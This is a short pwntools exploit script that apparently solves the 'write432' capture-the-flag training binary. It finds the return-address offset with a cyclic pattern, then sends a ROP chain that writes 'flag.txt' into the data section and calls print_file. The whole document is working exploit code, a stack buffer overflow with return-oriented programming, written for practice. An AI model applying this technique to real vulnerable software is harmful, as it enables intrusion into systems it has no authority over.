#!/bin/usr/python3
from pwn import *

def start():
	p = process("./write432")
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./write432")
context.log_level = "info"
context.delete_corefiles = True

data_section = elf.symbols.data_start
mov_gadget = elf.symbols.usefulGadgets

rop = ROP(elf)
pop_edi_ebp = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
rop.raw([pop_edi_ebp, data_section, "flag", mov_gadget])
rop.raw([pop_edi_ebp, data_section + 4, ".txt", mov_gadget])
rop.print_file(data_section)
rop_chain = rop.chain()

p = process("./write432")

io = start()
payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

eip = core.eip
eip_offset = cyclic_find(eip)
info("eip_offset = %#x", eip_offset)

io = start()
payload = flat(
	asm('nop') * eip_offset,
	rop_chain
)

io.sendlineafter(">", payload)
while True:
	tmp = io.recv()
	info(tmp)








